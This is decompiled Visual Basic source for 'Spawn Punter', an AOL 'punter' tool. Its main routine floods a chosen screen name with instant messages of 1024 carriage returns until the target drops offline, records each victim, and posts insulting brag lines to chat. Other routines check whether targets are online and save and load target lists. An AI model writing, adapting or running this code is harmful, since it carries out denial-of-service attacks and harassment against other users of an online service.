' Form1.frm
Option Explicit
Const c005E = 513 ' &H201%
Const c0062 = 514 ' &H202%
Const c0080 = 12 ' &HC%
Const c0094 = 16 ' &H10%
Const c0096 = 3 ' &H3%

Sub Brag1_Click ()
Dim l0020 As Variant
Dim l0024 As String
Dim l0026 As Variant
If  List1.ListCount = 0 Then MsgBox "No Names to Brag!", 16, " Spawn - Error": Exit Sub
subC68 "«–•¥( §paWn Punter - Brag All )¥•–»"
subDB8 (.6#)
subC68 "«–•¥( I Have Punted: " + List1.ListCount + " People. )¥•–»"
subDB8 (.6#)
Do
DoEvents
l0024$ = List1.List(l0020)
Randomize
l0026 = Int(Rnd * 5) + 1
If  l0026 = 1 Then subC68 "«–•¥( " + l0024$ + " - Fux0r.  )¥•–»"
If  l0026 = 2 Then subC68 "«–•¥( " + l0024$ + " - Kicked. )¥•–»"
If  l0026 = 3 Then subC68 "«–•¥( " + l0024$ + " - Booted. )¥•–»"
If  l0026 = 4 Then subC68 "«–•¥( " + l0024$ + " - Lame-Ass. )¥•–»"
If  l0026 = 5 Then subC68 "«–•¥( " + l0024$ + " - Farted. )¥•–»"
subDB8 (.6#)
l0020 = l0020 + 1
Loop Until List1.List(l0020) = ""
End Sub

Sub brag2_Click ()
Dim l002A As String
Dim l002C As String
l002A = InputBox$("Who do you want to brag about?", " Spawn - Brag One", "")
If  l002A = "" Then GoTo LD58
l002C$ = l002A
subC68 "«–•¥( §paWn Punter - Brag One )¥•–»"
subC68 "«–•¥( " + l002A + " - Punted. )¥•–»"
LD58:
Exit Sub
End Sub

Sub brag3_Click ()
If  List1.ListCount = 0 Then MsgBox "No Names to Brag!", 16, " Spawn - Error": Exit Sub
subC68 "«–•¥( §paWn Punter - Brag Nu )¥•–»"
subC68 "«–•¥( I Have Punted: " + List1.ListCount + " People. )¥•–»"
End Sub

Sub Command3D1_Click ()
Dim l0040 As Variant
Dim l004C As Integer
Dim l0050 As Integer
Dim l0056 As String
Dim l005A As Variant
' Const c005E = 513 ' &H201%
' Const c0062 = 514 ' &H202%
Dim l0064 As String
Dim l0066 As String
On Error Resume Next
If  Combo1.Text = "" Then MsgBox "There is Nobody to Punt!", 16, " Spawn - Error": Exit Sub
Command3D1.Visible = False
Command3D9.Visible = True
sub7D0 "IM$_OFF", "«–•¥( §paWn Punter )¥•–»"
subC68 "«–•¥( §paWn Punter ¹·º )¥•–»"
subC68 "«–•¥( Punting: " + Combo1.Text + " )¥•–»"
Randomize
l0040 = Int(Rnd * 5) + 1
If  l0040 = 1 Then subC68 "«–•¥( §paWn Owns Yew! )¥•–»"
If  l0040 = 2 Then subC68 "«–•¥( Get Down and Beg! )¥•–»"
If  l0040 = 3 Then subC68 "«–•¥( Bye, ya Lame-ass! )¥•–»"
If  l0040 = 4 Then subC68 "«–•¥( Have a Nice Day! )¥•–»"
If  l0040 = 5 Then subC68 "«–•¥( Die, yew Fux0r! )¥•–»"
Do
Command3D7.Caption = "Punting..."
If  Command3D9.Visible = False Then Exit Sub
l004C% = extfn3048("#32770", "America Online")
l0050% = extfn2FD8(l004C%, "Static")
l0050% = extfn2E88(l0050%, 2)
l0056$ = fn6F0(l0050%)
l005A = extfn2FA0(l004C%, "OK")
l0040 = extfn2EF8(l005A, c005E, 0, 0)
l0040 = extfn2EF8(l005A, c0062, 0, 0)
If  InStr(l0056$, "cannot") Then GoTo L1632
If  InStr(l0056$, "is not") Then GoTo L17BA
l0064$ = Combo1.Text
l0066$ = String$(1024, Chr(13))
sub878 l0064$, l0066$
l004C% = extfn3048("#32770", "America Online")
l0050% = extfn2FD8(l004C%, "Static")
l0050% = extfn2E88(l0050%, 2)
l0056$ = fn6F0(l0050%)
l005A = extfn2FA0(l004C%, "OK")
l0040 = extfn2EF8(l005A, c005E, 0, 0)
l0040 = extfn2EF8(l005A, c0062, 0, 0)
If  InStr(l0056$, "cannot") Then GoTo L1632
If  InStr(l0056$, "is not") Then GoTo L17BA
If  Command3D9.Visible = False Then Exit Sub
Loop Until Command3D9.Visible = False
sub7D0 "$IM_ON", "«–•¥( §paWn Punter )¥•–»"
subDB8 (.1#)
subC68 "«–•¥( Complete - " + Combo1.Text + " )¥•–»"
Command3D1.Visible = True
Command3D9.Visible = False
l0040 = extfn2EF8(l005A, c005E, 0, 0)
l0040 = extfn2EF8(l005A, c0062, 0, 0)
Command3D7.Caption = "Punted Complete!"
subDB8 (1)
Command3D7.Caption = "Spawn Status"
Exit Sub
L1632:
sub7D0 "$IM_ON", "«–•¥( §paWn Punter )¥•–»"
subDB8 (.1#)
subC68 "«–•¥( " + Combo1.Text + " - IMs Off. )¥•–»"
Command3D1.Visible = True
Command3D9.Visible = False
l0040 = extfn2EF8(l005A, c005E, 0, 0)
l0040 = extfn2EF8(l005A, c0062, 0, 0)
Command3D7.Caption = "Punted Aborted"
subDB8 (1)
Command3D7.Caption = "Spawn Status"
Exit Sub
L17BA:
sub7D0 "$IM_ON", "«–•¥( §paWn Punter )¥•–»"
subDB8 (.1#)
subC68 "«–•¥( " + Combo1.Text + " - Offline )¥•–»"
Command3D1.Visible = True
Command3D9.Visible = False
l0040 = extfn2EF8(l005A, c005E, 0, 0)
l0040 = extfn2EF8(l005A, c0062, 0, 0)
Command3D7.Caption = "Punted Offline!"
subDB8 (1)
Command3D7.Caption = "Spawn Status"
List1.AddItem Combo1.Text
Combo1.Text = ""
Exit Sub
End Sub

Sub Command3D2_Click ()
List1.Clear
End Sub

Sub Command3D3_Click ()
On Error GoTo L19E2
List1.RemoveItem (List1.ListIndex)
L19E2:
Exit Sub
Resume
End Sub

Sub Command3D4_Click ()
Dim l0068 As Variant
On Error Resume Next
If  Combo1.Text = "" Then MsgBox "There is Nobody to Fake Punt!", 16, " Spawn - Error": Exit Sub
subC68 "«–•¥( §paWn Punter ¹·º )¥•–»"
subC68 "«–•¥( Punting: " + Combo1.Text + " )¥•–»"
Randomize
l0068 = Int(Rnd * 5) + 1
If  l0068 = 1 Then subC68 "«–•¥( §paWn Owns Yew! )¥•–»"
If  l0068 = 2 Then subC68 "«–•¥( Get Down and Beg! )¥•–»"
If  l0068 = 3 Then subC68 "«–•¥( Bye, ya Lame-ass! )¥•–»"
If  l0068 = 4 Then subC68 "«–•¥( Have a Nice Day! )¥•–»"
If  l0068 = 5 Then subC68 "«–•¥( Die, yew Fux0r! )¥•–»"
End Sub

Sub Command3D5_Click ()
Me.WindowState = 1
End Sub

Sub Command3D6_Click ()
Dim l006C As Variant
l006C = MsgBox("Are you sure you want to Exit Spawn Punter?", 36, " Spawn - Exit")
If  l006C = 6 Then subC68 "«–•¥( §paWn Punter ßy Goon )¥•–»"
If  l006C = 6 Then subC68 Chr(160) + Chr(160) + Chr(160) + Chr(160) + Chr(160) + "«–•¥( Access: Member )¥•–»"
If  l006C = 6 Then subC68 Chr(160) + Chr(160) + Chr(160) + Chr(160) + Chr(160) + "«–•¥( §tatus: Unloaded )¥•–»"
If  l006C = 6 Then End
If  l006C = 7 Then Exit Sub
End Sub

Sub Command3D7_Click ()
Command3D7.Caption = "Spawn Status"
End Sub

Sub Command3D8_Click ()
Dim l0070 As Variant
Dim l0074 As Variant
Dim l0078 As Variant
Dim l007C As Variant
' Const c0080 = 12 ' &HC%
Dim l0084 As Variant
Dim l0088 As Variant
Dim l008C As Variant
Dim l0090 As Variant
' Const c0094 = 16 ' &H10%
' Const c0096 = 3 ' &H3%
If  List1 = "" Then MsgBox "Choose someone first!", 16, " Spawn - Error!": Exit Sub
l0070 = extfn3048("AOL Frame25", 0&)
subBC0 "Locate a Member Online"
Do: DoEvents
l0074 = extfn2FA0(l0070, "Locate Member Online")
Loop Until l0074 <> 0
l0078 = extfn2FD8(l0074, "_AOL_EDIT")
l007C = extfn2FA0(l0074, "OK")
l0084 = extfn2F30(l0078, c0080, 0, List1)
l0084 = extfn2EF8(l007C, c005E, 0, 0)
l0084 = extfn2EF8(l007C, c0062, 0, 0)
Do: DoEvents
l0088 = extfn3048("#32770", "America Online")
l008C = extfn2FA0(l0070, "Locate " & List1)
If  l0088 <> 0 Then
l0090 = extfn2FA0(l0088, "ok")
l0084 = extfn2EF8(l0090, c005E, 0, 0)
l0084 = extfn2EF8(l0090, c0062, 0, 0)
GoTo L2304:
End If
If  l008C <> 0 Then
l0084 = extfn2EF8(l008C, c0094, 0, 0)
GoTo L2206:
End If
Loop
L2206:
l0084 = extfn2EF8(l0074, c0094, 0, 0)
subC68 "«–•¥( §paWn Punter - Online Check )¥•–»"
subC68 "«–•¥( Checked: " + List1 + " - Online )¥•–»"
MsgBox List1 + " is still Online.", 16, " Online"
Exit Sub
L2304:
l0084 = extfn2EF8(l0074, c0094, 0, 0)
subC68 "«–•¥( §paWn Punter - Online Check )¥•–»"
subC68 "«–•¥( Checked: " + List1 + " - Offline )¥•–»"
MsgBox List1 + " is Offline.", 16, " Offline"
Exit Sub
End Sub

Sub Command3D9_Click ()
sub7D0 "$IM_ON", "«–•¥( §paWn Punter )¥•–»"
subC68 "«–•¥( " + Combo1.Text + " - Stopped. )¥•–»"
Command3D1.Visible = True
Command3D9.Visible = False
End Sub

Sub Form_Load ()
subD80 Me
sub530 Me, c0096
subC68 "«–•¥( §paWn Punter ßy Goon )¥•–»"
subC68 Chr(160) + Chr(160) + Chr(160) + Chr(160) + Chr(160) + "«–•¥( Access: Member )¥•–»"
subC68 Chr(160) + Chr(160) + Chr(160) + Chr(160) + Chr(160) + Chr(160) + Chr(160) + "«–•¥( §tatus: Loaded )¥•–»"
End Sub

Sub im1_Click ()
sub7D0 "$IM_ON", "«–•¥( §paWn Punter )¥•–»"
End Sub

Sub im2_Click ()
sub7D0 "$IM_Off", "«–•¥( §paWn Punter )¥•–»"
End Sub

Sub other4_Click ()
subD10
End Sub

Sub other5_Click ()
sub8E8
End Sub

Sub Other9_Click ()
sub920
End Sub

Sub sub4240 ()
End Sub

Sub Punt3_Click ()
Dim l00A2 As Variant
Dim l00A6 As Variant
Dim l00AA As String
Dim l00AC As String
If  List1.ListCount = 0 Then MsgBox "No Names to save!", 16, " Spawn - Error": Exit Sub
On Error Resume Next
CMDialog1.InitDir = (App.Path)
CMDialog1.Flags = &H4& Or &H2& Or &H800&
CMDialog1.DefaultExt = "Pnt"
CMDialog1.DialogTitle = "Save Names as ..."
CMDialog1.Filter = "Spawn (*.Pnt)|*.Pnt|"
CMDialog1.MaxFileSize = 2000
CMDialog1.Filename = ""
CMDialog1.CancelError = True
CMDialog1.Action = 2
Select Case Err
    Case 0:
    l00A2 = List1.ListCount - 1
    For l00A6 = 0 To l00A2 - 1
    l00AA$ = List1.List(l00A6)
    l00AC$ = l00AC$ + l00AA$ & ","
    Next l00A6
    l00AC$ = l00AC$ + List1.List(l00A2)
        Open CMDialog1.Filename For Output As #1
            Print #1, l00AC$
        Close #1
    Case 32755:
        Err = False
    Case Else:
        MsgBox "Unexpected error:" & Str(Err) & Chr$(13) & "Error message: " & Error$(Err), 16, "Unexpected Error!!!"
End Select
End Sub

Sub Punt4_Click ()
Dim l00AE As String
Dim l00B0 As Integer
On Error Resume Next
CMDialog1.InitDir = (App.Path)
CMDialog1.Flags = &H1000& Or &H4& Or &H800& Or &H4000&
CMDialog1.DefaultExt = "Pnt"
CMDialog1.DialogTitle = "Load List"
CMDialog1.Filter = "Spawn (*.Pnt)|*.Pnt|Text Files (*.TXT)|*.TXT|Corruption Files (*.Tos)|*.Tos|All Files (*.*)|*.*|"
CMDialog1.MaxFileSize = 2000
CMDialog1.Filename = ""
CMDialog1.CancelError = True
CMDialog1.Action = 1
Select Case Err
    Case 0:
List1.Clear
    Open CMDialog1.Filename For Input As #1
    Do
    Input #1, l00AE$
    l00AE$ = Trim(l00AE$)
    If  l00AE$ <> "" Then List1.AddItem l00AE$
    l00B0% = DoEvents()
    Loop Until EOF(1)
    Close #1
End Select
End Sub

Sub Punt5_Click ()
List1.Clear
End Sub

Sub Punt7_Click ()
sub1B0 List1
End Sub

Sub Punt8_Click ()
Dim l00B2 As String
Dim l00B4 As Variant
Dim l00B8 As Variant
Dim l00BC As String
l00B2 = InputBox$("Who do you want to Add?", " Spawn - Add Name", "")
If  l00B2 = "" Then GoTo 12
 For l00B4 = 0 To List1.ListCount - 1
 If  l00B8 = List1.List(l00B4) Then
 GoTo L2CE2:
  End If
 Next l00B4
l00BC$ = l00B2
   List1.AddItem l00BC$
L2CE2:
12
End Sub

Sub punt9_Click ()
Dim l00BE As String
Dim l00C0 As String
Dim l00C2 As Variant
Dim l00C6 As Variant
Dim l00CA As Variant
Dim l00CE As Variant
Dim l00D2 As Variant
Dim l00D6 As Variant
Dim l00DA As Variant
Dim l00DE As Variant
l00BE = InputBox$("Who do you want Check Online?", " Spawn - Online Check", "")
If  l00BE = "" Then Exit Sub
l00C0$ = l00BE
l00C2 = extfn3048("AOL Frame25", 0&)
subBC0 "Locate a Member Online"
Do: DoEvents
l00C6 = extfn2FA0(l00C2, "Locate Member Online")
Loop Until l00C6 <> 0
l00CA = extfn2FD8(l00C6, "_AOL_EDIT")
l00CE = extfn2FA0(l00C6, "OK")
l00D2 = extfn2F30(l00CA, c0080, 0, l00C0$)
l00D2 = extfn2EF8(l00CE, c005E, 0, 0)
l00D2 = extfn2EF8(l00CE, c0062, 0, 0)
Do: DoEvents
l00D6 = extfn3048("#32770", "America Online")
l00DA = extfn2FA0(l00C2, "Locate " & l00C0$)
If  l00D6 <> 0 Then
l00DE = extfn2FA0(l00D6, "ok")
l00D2 = extfn2EF8(l00DE, c005E, 0, 0)
l00D2 = extfn2EF8(l00DE, c0062, 0, 0)
GoTo L319E:
End If
If  l00DA <> 0 Then
l00D2 = extfn2EF8(l00DA, c0094, 0, 0)
GoTo L30AA:
End If
Loop
L30AA:
l00D2 = extfn2EF8(l00C6, c0094, 0, 0)
subC68 "«–•¥( §paWn Punter - Online Check )¥•–»"
subC68 "«–•¥( Checked: " + l00C0$ + " - Online )¥•–»"
MsgBox l00C0$ + " is Still Online.", 16, " Online"
Exit Sub
L319E:
l00D2 = extfn2EF8(l00C6, c0094, 0, 0)
subC68 "«–•¥( §paWn Punter - Online Check )¥•–»"
subC68 "«–•¥( Checked: " + l00C0$ + " - Offline )¥•–»"
MsgBox l00C0$ + " is Offline.", 16, " Offine"
Exit Sub
End Sub

Sub sub138 ()
End Sub
